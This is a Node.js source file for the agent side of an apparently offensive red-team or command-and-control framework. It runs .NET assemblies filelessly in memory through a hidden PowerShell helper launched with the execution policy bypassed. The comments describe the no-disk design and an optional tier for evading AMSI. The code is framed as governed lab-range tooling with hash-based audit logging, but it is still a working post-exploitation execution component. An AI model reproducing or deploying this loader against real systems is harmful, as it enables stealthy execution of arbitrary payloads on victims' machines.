// VARVEL — the in-memory execution tier, AGENT side (Node): governed 'inline-dotnet'.
//
// The Node agent has no CLR, so it delegates to a PowerShell HELPER PROCESS
// (agents/inline-exec.ps1) the honest way: the assembly bytes ride a JSON job on the
// helper's STDIN, the helper does [Reflection.Assembly]::Load(byte[]) + entry invoke in
// ITS OWN process memory with console capture, and emits ONE JSON result line on stdout.
// BY CONSTRUCTION THERE IS NO DISK PATH: the runner contract passes a JSON string, never
// a file path; the helper never writes a byte. Detection (AMSI scans the byte[] load on
// Win10+) is never dodged silently — it is the detoracle's measurement input, unless the
// operator has explicitly armed the governed evasion tier (engine/evasion.mjs, default
// OFF, double-gated, patch-verified, restorable — doctrine 2026-08-12).
//
// THE RUNNER IS THE INJECTABLE SEAM (hermetic tests inject a fake):
//   runner(jobJson:string) -> Promise<{ stdout, stderr, error? }>
//   - stdout: the helper's single JSON result line { exitCode, timedOut, stdout, stderr }
//   - error: set when the helper never produced a result (spawn failure, timeout-kill)
//
// RESULT CONTRACT (what rides the governed result path):
//   - Governance refusals are PLAIN LOUD TEXT starting 'inline-dotnet REFUSED/REJECTED'
//     (nothing ran; no hash exists because nothing executed).
//   - An actual execution attempt ALWAYS returns ONE JSON string, hash FIRST:
//     {"sha256","bytes","entryPoint","exitCode","timedOut","stdout","stderr"} — the
//     ledger preview (120 chars) therefore always shows the sha256 accountability trail.

import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { parseInlineSpec } from '../engine/inlineexec.mjs';

export const PS_HELPER_PATH = fileURLToPath(new URL('./inline-exec.ps1', import.meta.url));
export const HELPER_TIMEOUT_MS = 90000; // then the helper tree is killed — the loop survives
const MAX_HELPER_STDOUT = 4 * 1024 * 1024;
const MAX_HELPER_STDERR = 200 * 1024;

// The real runner: spawn powershell.exe with the helper script, pipe the job JSON to its
// stdin, collect its stdout/stderr, kill the tree on timeout. Honest spawn — no hidden
// window tricks beyond windowsHide (the agent itself runs hidden on the range), no
// encoded-command games: the script is a reviewed repo file and the job is data on stdin.
export function powerShellHelperRunner({ helperPath = PS_HELPER_PATH, timeoutMs = HELPER_TIMEOUT_MS, spawnFn = spawn, exe = 'powershell.exe' } = {}) {
  return (jobJson) => new Promise((resolve) => {
    let child;
    try {
      child = spawnFn(exe, ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', helperPath], { windowsHide: true });
    } catch (e) {
      return resolve({ stdout: '', stderr: '', error: 'powershell spawn failed: ' + ((e && e.message) || e) });
    }
    let out = '', err = '', done = false;
    const finish = (error) => { if (!done) { done = true; clearTimeout(timer); resolve({ stdout: out, stderr: err, error }); } };
    const timer = setTimeout(() => {
      try { child.kill(); } catch {}
      finish('helper timeout after ' + timeoutMs + 'ms — process tree killed (the task loop survives; nothing was written to disk)');
    }, timeoutMs);
    if (timer.unref) timer.unref();
    child.on('error', (e) => finish('powershell spawn failed: ' + ((e && e.message) || e)));
    child.stdout.on('data', (d) => { if (out.length < MAX_HELPER_STDOUT) out += d; });
    child.stderr.on('data', (d) => { if (err.length < MAX_HELPER_STDERR) err += d; });
    child.on('close', () => finish(null));
    child.stdin.on('error', () => {}); // EPIPE when the child died before reading the job
    child.stdin.write(jobJson);
    child.stdin.end();
  });
}

// Execute one inline-dotnet task payload. data = the task data string (JSON spec).
// Returns the result body string per the contract above. Never throws.
export async function runInlineDotnet(data, { runner } = {}) {
  let spec;
  try { spec = parseInlineSpec(data); } catch (e) {
    return 'inline-dotnet REJECTED: ' + ((e && e.message) || e);
  }
  if (typeof runner !== 'function') {
    return 'inline-dotnet REFUSED: this agent has no in-memory execution runner (sha256 ' + spec.sha256 + ' was NOT executed)';
  }
  // The job the helper receives: bytes + args + entry point. No path exists in this
  // object — the no-disk property is enforced by the shape of the contract itself.
  const jobJson = JSON.stringify({ assemblyB64: spec.b64, args: spec.args, entryPoint: spec.entryPoint });
  const base = { sha256: spec.sha256, bytes: spec.bytes.length, entryPoint: spec.entryPoint || null };
  let r;
  try { r = await runner(jobJson); } catch (e) { r = { stdout: '', stderr: '', error: 'runner threw: ' + ((e && e.message) || e) }; }
  r = r || {};
  if (r.error) {
    const timedOut = /timeout/i.test(String(r.error));
    return JSON.stringify({ ...base, exitCode: -1, timedOut, stdout: String(r.stdout || ''), stderr: String(r.error + (r.stderr ? '\n' + r.stderr : '')).slice(0, 60000) });
  }
  // The helper's last non-empty stdout line is the result JSON (anything before it is
  // powershell host noise — profile banners are off via -NoProfile, but be forgiving).
  const lines = String(r.stdout || '').split(/\r?\n/).filter((l) => l.trim().length > 0);
  let parsed = null;
  for (let i = lines.length - 1; i >= 0 && !parsed; i--) { try { parsed = JSON.parse(lines[i]); } catch {} }
  if (!parsed || typeof parsed !== 'object') {
    return JSON.stringify({ ...base, exitCode: -1, timedOut: false, stdout: String(r.stdout || '').slice(0, 60000), stderr: 'helper output unparseable as result JSON' + (r.stderr ? ' — helper stderr: ' + String(r.stderr).slice(0, 2000) : '') });
  }
  return JSON.stringify({
    ...base,
    exitCode: Number.isInteger(parsed.exitCode) ? parsed.exitCode : -1,
    timedOut: parsed.timedOut === true,
    stdout: String(parsed.stdout ?? '').slice(0, 60000),
    stderr: String(parsed.stderr ?? '').slice(0, 60000),
  });
}
